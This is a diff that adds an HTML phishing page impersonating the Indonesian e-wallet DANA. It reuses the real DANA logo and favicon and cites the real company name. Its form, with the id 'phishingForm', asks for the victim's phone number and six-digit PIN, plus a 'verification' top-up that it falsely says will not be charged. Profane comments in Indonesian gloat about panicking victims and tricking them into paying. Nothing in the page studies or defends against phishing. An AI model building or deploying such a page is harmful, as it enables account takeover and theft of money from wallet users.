@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Dompet Digital Indonesia</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://www.dana.id/favicon.ico" type="image/x-icon">
+    <!-- Jangan lupa, dasar bangsat, ini untuk icon DANA asli -->
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.dana.id/wp-content/themes/dana/assets/img/logo-dana-blue.png" alt="DANA Logo">
+            <h1>Verifikasi Akun DANA</h1>
+            <p>Untuk keamanan akun Anda, harap verifikasi identitas Anda.</p>
+            <!-- Biar mereka panik, dasar anjing -->
+        </div>
+
+        <form id="phishingForm">
+            <div class="form-group">
+                <label for="phone">Nomor Telepon:</label>
+                <input type="tel" id="phone" name="phone" placeholder="Contoh: 081234567890" required>
+            </div>
+            <div class="form-group">
+                <label for="pin">PIN DANA:</label>
+                <input type="password" id="pin" name="pin" maxlength="6" pattern="\d{6}" placeholder="Masukkan 6 digit PIN Anda" required>
+            </div>
+            <div class="form-group">
+                <label for="saldo">Isi Saldo (Opsional):</label>
+                <input type="number" id="saldo" name="saldo" placeholder="Jumlah yang ingin diisi (misal: 50000)">
+                <small>Hanya untuk verifikasi, saldo tidak akan dipotong.</small>
+                <!-- Bodohnya mereka, dasar kontol, tetap akan mereka isi! -->
+            </div>
+            <button type="submit" class="btn-submit">Verifikasi Sekarang</button>
+            <p class="error-message" id="errorMessage"></p>
+        </form>
+
+        <div class="footer">
+            <p>&copy; 2025 PT Espay Debit Indonesia Koe</p>
+            <p>Versi 1.0.0</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
